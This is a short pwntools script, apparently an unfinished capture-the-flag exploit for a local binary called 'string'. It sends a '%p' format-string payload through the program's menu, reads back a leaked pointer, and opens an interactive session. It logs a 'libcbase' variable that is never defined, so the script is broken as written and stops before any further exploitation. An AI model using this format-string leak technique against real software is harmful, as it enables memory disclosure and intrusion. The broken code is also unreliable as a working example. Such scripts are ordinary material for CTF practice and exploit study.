#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./string")
elf = ELF("./string")
libc = ELF("./libc.so.6")

def Input(data):
    p.sendlineafter("> ", '1')
    p.sendafter("Input: ", data)

def Print():
    p.sendlineafter("> ", '2')

Input("%p")

gdb.attach(p)
Print()
p.recvuntil("string: ")
leak = int(p.recv(10), 16)
log.info("leak: "+hex(leak))

log.info("libcbase: "+hex(libcbase))


p.interactive()
